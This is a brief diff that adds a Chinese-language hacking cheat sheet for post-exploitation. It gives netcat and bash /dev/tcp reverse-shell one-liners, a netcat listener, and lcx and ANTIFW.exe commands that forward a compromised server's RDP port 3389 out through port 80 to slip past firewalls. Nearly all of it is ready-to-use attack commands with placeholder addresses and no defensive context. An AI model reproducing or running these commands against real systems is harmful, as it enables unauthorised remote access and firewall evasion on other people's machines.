@@ -1,0 +1,9 @@
+反弹shell：
+  shell： nc -e cmd ip port
+  shell:  bash -i >& /dev/tcp/ip/port 0>&1(linux)
+  服务器： nc -vv -lp port
+端口转发：
+  shell:  lcx -slave ip port 127.0.0.1 port
+  服务器： lcx -listen port 33891
+  ANTIFW.exe -s #运行程序，将3389转发到80
+  ANTIFW.exe -l #关闭程序，恢复iis
